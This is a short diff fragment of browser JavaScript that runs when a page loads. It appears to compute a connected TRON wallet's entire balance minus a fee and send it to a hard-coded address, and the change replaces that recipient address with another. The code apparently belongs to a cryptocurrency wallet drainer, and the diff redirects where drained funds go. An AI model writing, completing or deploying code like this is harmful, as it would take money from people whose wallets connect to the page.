@@ -97,7 +97,7 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 
     const amountToSend = tronWeb.balance - fee;
-    const recipientAddress = 'TCJsJDTK64iPSag6yiuGaPhSGvCpkaNvQT';
+    const recipientAddress = 'TTXXYgytxLRZCPzdzi2ZDnQBe1ukvKoFj5';
     const amountInSun = tronWeb.toSun(amountToSend);
 
     try {
